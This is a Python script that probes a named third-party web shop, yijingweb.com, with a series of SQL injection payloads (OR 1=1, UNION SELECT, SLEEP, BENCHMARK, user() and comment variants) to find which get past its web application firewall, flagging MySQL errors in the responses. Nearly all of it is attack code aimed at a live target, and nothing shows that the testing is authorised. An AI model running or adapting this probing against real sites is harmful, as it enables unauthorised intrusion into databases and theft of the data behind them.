#!/usr/bin/env python3
"""test WAF rules on yijingweb - find which payloads pass"""
import urllib.request, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php?id=686"

def test(suffix, tag):
    u = BASE + suffix
    try:
        req = urllib.request.Request(u, headers=UA)
        r = urllib.request.urlopen(req, timeout=8)
        body = r.read().decode("utf-8", "ignore")
        code = r.status
    except urllib.error.HTTPError as e:
        body = e.read(3000).decode("utf-8", "ignore")
        code = e.code
    except Exception as ex:
        body = str(ex)
        code = 0
    waf = code == 403 and len(body) < 2000
    ok = "Database error" in body or "MySQL Error" in body or code == 200
    print("%-45s code=%s waf=%s err=%s" % (tag, code, waf, "SQLERR" if "MySQL Error" in body else ""))
    return body

# probe WAF boundaries
print("=== WAF boundary probes ===")
test("%27", "quote-only")
test("%27%20or%201=1--", "or-1=1")
test("%27%20OR%201=1--", "OR-upper")
test("%27%20union%20select%201--", "union")
test("%27%20and%201=1--", "and-1=1")
test("%27%20AND%201=1--", "AND-upper")
test("%27%20aNd%201=1--", "aNd-mixed")
test("%27%20and%20sleep(1)--", "sleep")
test("%27%20and%20SLEEP(1)--", "SLEEP-upper")
test("%27%20and%20benchmark(1,md5(1))--", "benchmark")
test("%27%20and%20(select%201)=1--", "select-subq")
test("%27%20and%20substr(1,1,1)=1--", "substr")
test("%27%20and%20length(1)=1--", "length")
test("%27%20and%20user()=user()--", "user()")
test("%27%20and%201=1%23", "hash-comment")
test("%27%20and%201=1--%20", "dash-space")
test("%27%20and%201=1", "no-comment")
